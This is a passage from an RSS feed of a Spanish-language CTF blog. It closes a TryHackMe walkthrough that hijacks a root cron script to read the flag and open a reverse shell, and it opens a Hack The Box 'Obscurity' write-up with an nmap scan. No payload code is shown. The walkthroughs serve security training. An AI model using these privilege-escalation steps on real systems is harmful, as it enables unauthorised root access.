&lt;p&gt;Utilizamos pspy para ver los cron job, y encontramos uno que ejecuta &lt;code&gt;cleanupscript.sh&lt;/code&gt; que se encuentra en &lt;code&gt;/home/brian/cleanup/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204636.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204657.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell inversa al archivo y obtenemos una shell con usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_205221.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Obscurity</title>
        <link>https://sckull.github.io/posts/obscurity/</link>
        <pubDate>Sat, 09 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 09 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/obscurity/</guid>
        <description>Obscurity es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Obscurity es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Obscurity&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.168&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/83743&#34;&gt;clubby789&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jan  8 20:18:09 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.168&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.168
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.27s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Thu, &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 02:23:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Server: BadHTTPServer
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Last-Modified: Thu, &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 02:23:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;4171&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: Closed
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IE=Edge&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;keywords&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Easy Profile Template
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     http://www.templatemo.com/tm-467-easy-profile
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- stylesheet css --&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/bootstrap.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/font-awesome.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/templatemo-blue.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;body data-spy&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scroll&amp;#34;&lt;/span&gt; data-target&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.navbar-collapse&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- preloader section --&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!--
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;preloader&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sk-spinner sk-spinner-wordpress&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   HTTPOptions: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Thu, &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 02:23:52
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Server: BadHTTPServer
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Last-Modified: Thu, &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 02:23:52
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;4171&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: Closed
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IE=Edge&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;keywords&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Easy Profile Template
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     http://www.templatemo.com/tm-467-easy-profile
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- stylesheet css --&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/bootstrap.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/font-awesome.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;css/templatemo-blue.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;body data-spy&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scroll&amp;#34;&lt;/span&gt; data-target&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.navbar-collapse&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- preloader section --&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!--
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;preloader&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sk-spinner sk-spinner-wordpress&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: BadHTTPServer
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: 0bscura
9000/tcp closed cslistener
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1/8%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5E168E70%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Get
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... snip ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
SF:-spinner&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20sk-spinner-wordpress&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&amp;gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Wed Jan  8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una &lt;strong&gt;empresa&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-33-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
